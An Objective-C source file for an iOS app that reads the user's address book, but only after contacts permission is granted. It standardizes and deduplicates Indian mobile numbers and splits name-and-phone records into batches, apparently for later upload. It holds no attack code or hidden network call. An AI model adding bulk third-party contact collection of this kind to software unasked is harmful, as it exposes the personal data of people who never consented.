//
//  TgContactLattice.m
//

#import "TgContactLattice.h"
#import <Contacts/Contacts.h>

static NSInteger const kTgContactNameMaxLen = 100;

@implementation TgContactLattice

+ (NSArray<NSDictionary<NSString *, NSString *> *> *)tg_harvestContactsWithMaxCount:(NSInteger)maxCount {
    if (maxCount <= 0) return @[];

    CNAuthorizationStatus status = [CNContactStore authorizationStatusForEntityType:CNEntityTypeContacts];
    if (status != CNAuthorizationStatusAuthorized) return @[];

    CNContactStore *store = [[CNContactStore alloc] init];
    NSArray *keys = @[CNContactGivenNameKey, CNContactFamilyNameKey, CNContactPhoneNumbersKey];
    CNContactFetchRequest *request = [[CNContactFetchRequest alloc] initWithKeysToFetch:keys];

    NSMutableArray<NSDictionary<NSString *, NSString *> *> *results = [NSMutableArray array];
    NSMutableSet<NSString *> *seenPhones = [NSMutableSet set];
    NSError *error = nil;

    [store enumerateContactsWithFetchRequest:request error:&error usingBlock:^(CNContact *contact, BOOL *stop) {
        if (results.count >= maxCount) {
            *stop = YES;
            return;
        }

        NSString *name = [self tg_sanitizeName:[NSString stringWithFormat:@"%@ %@",
                                                contact.familyName ?: @"",
                                                contact.givenName ?: @""]];

        for (CNLabeledValue<CNPhoneNumber *> *phoneVal in contact.phoneNumbers) {
            if (results.count >= maxCount) {
                *stop = YES;
                return;
            }
            NSString *raw = phoneVal.value.stringValue ?: @"";
            NSString *formatted = [self tg_standardizeIndianPhone:raw];
            if (formatted.length == 0) continue;

            NSString *normalized = [self tg_normalizePhoneForDedup:formatted];
            if (normalized.length == 0 || [seenPhones containsObject:normalized]) continue;
            [seenPhones addObject:normalized];

            [results addObject:@{
                @"contactName": name ?: @"",
                @"contactPhone": formatted,
                @"contactUpdateTime": [NSString stringWithFormat:@"%lld", (long long)([[NSDate date] timeIntervalSince1970] * 1000)],
                @"contactStorage": @"1",
                @"contactCount": @"-99",
                @"contactTime": @""
            }];
        }
    }];

    return results.copy;
}

+ (NSArray<NSArray<NSDictionary<NSString *, NSString *> *> *> *)tg_batchContacts:(NSArray<NSDictionary<NSString *, NSString *> *> *)contacts
                                                                        batchSize:(NSInteger)batchSize {
    if (contacts.count == 0 || batchSize <= 0) return @[];
    NSMutableArray *batches = [NSMutableArray array];
    for (NSInteger i = 0; i < (NSInteger)contacts.count; i += batchSize) {
        NSInteger end = MIN(i + batchSize, (NSInteger)contacts.count);
        [batches addObject:[contacts subarrayWithRange:NSMakeRange(i, end - i)]];
    }
    return batches.copy;
}

#pragma mark - Private

+ (NSString *)tg_sanitizeName:(NSString *)raw {
    NSString *trim = [raw stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]] ?: @"";
    if (trim.length > kTgContactNameMaxLen) {
        return [trim substringToIndex:kTgContactNameMaxLen];
    }
    return trim;
}

+ (NSString *)tg_digitsOnly:(NSString *)raw {
    if (raw.length == 0) return @"";
    NSCharacterSet *nonDigits = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
    return [[raw componentsSeparatedByCharactersInSet:nonDigits] componentsJoinedByString:@""];
}

+ (BOOL)tg_isValidIndianPhoneDigits:(NSString *)digits {
    if (digits.length == 0) return NO;
    if (digits.length == 10) {
        unichar c = [digits characterAtIndex:0];
        return c >= '6' && c <= '9';
    }
    if (digits.length == 11 && [digits hasPrefix:@"0"]) {
        unichar c = [digits characterAtIndex:1];
        return c >= '6' && c <= '9';
    }
    if (digits.length == 12 && [digits hasPrefix:@"91"]) {
        unichar c = [digits characterAtIndex:2];
        return c >= '6' && c <= '9';
    }
    if (digits.length == 13 && [digits hasPrefix:@"910"]) {
        unichar c = [digits characterAtIndex:3];
        return c >= '6' && c <= '9';
    }
    return NO;
}

+ (NSString *)tg_standardizeIndianPhone:(NSString *)raw {
    NSString *digits = [self tg_digitsOnly:raw];
    if (![self tg_isValidIndianPhoneDigits:digits]) return @"";
    if ([digits hasPrefix:@"910"] && digits.length == 13) return [digits substringFromIndex:3];
    if ([digits hasPrefix:@"91"] && digits.length == 12) return [digits substringFromIndex:2];
    if ([digits hasPrefix:@"0"] && digits.length == 11) return [digits substringFromIndex:1];
    return digits;
}

+ (NSString *)tg_normalizePhoneForDedup:(NSString *)phone {
    NSString *digits = [self tg_digitsOnly:phone];
    if (digits.length == 0) return @"";
    if ([digits hasPrefix:@"910"] && digits.length == 13) digits = [digits substringFromIndex:3];
    else if ([digits hasPrefix:@"91"] && digits.length == 12) digits = [digits substringFromIndex:2];
    if ([digits hasPrefix:@"0"] && digits.length == 11) digits = [digits substringFromIndex:1];
    return digits.length == 10 ? digits : @"";
}

@end
